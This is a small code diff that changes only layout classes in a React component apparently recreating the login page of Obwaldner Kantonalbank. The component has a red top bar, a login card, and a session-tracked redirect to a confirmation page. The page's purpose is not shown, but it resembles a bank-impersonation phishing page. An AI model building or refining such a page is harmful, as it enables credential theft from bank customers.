@@ -61,11 +61,11 @@ const ChObwaldnerKantonalbank = () => {
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
-      <div className="min-h-screen flex flex-col bg-[#f5f5f5] md:bg-white">
+      <div className="min-h-screen bg-[#f5f5f5] md:bg-white">
         {/* Roter Top-Balken */}
         <div style={{ height: 6, backgroundColor: RED }} />
 
-        <main className="flex-1 px-0 md:px-4">
+        <main className="px-0 md:px-4">
           {/* Login-Card */}
           <div className="w-full md:max-w-[494px] mx-auto mt-0 md:mt-16 bg-white overflow-hidden md:shadow-sm md:rounded-lg md:border md:border-[#d9d9d9] md:min-h-[720px] flex flex-col">
             {/* Header */}
